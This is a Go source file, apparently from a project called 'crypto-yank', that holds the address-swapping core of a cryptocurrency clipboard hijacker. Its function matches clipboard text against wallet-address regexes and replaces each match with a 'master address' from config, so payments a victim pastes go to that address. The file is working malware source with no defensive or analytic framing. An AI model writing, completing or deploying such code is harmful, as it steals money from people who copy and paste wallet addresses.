package address

import (
	config "crypto-yank/config"
	"errors"
	"log"
	"regexp"
	"strings"
)

// Go through all regex matches, compile regex for them,
// if match, return updated clipboardStr
func FindClipBoardMatch(clipboardStr string) (string, error) {
	masterAddresses, err := config.GetMasterAddresses()

	if err != nil {
		log.Fatalf("error getting masterAddresses, %s", err.Error())
		return "", err
	}

	// go through all regex, check for match
	for _, regexMatch := range config.RegexMatches {
		r, _ := regexp.Compile(regexMatch.RegexMatch)

		// found match, return new str
		if r.MatchString(strings.TrimSpace(clipboardStr)) {
			newStr := r.ReplaceAllString(strings.TrimSpace(clipboardStr), masterAddresses[regexMatch.CryptoName])
			log.Printf("found crypto:%s, replacing with:'%s'", regexMatch.CryptoName, newStr)
			return newStr, nil
		}
	}
	return "", errors.New("No match found")
}
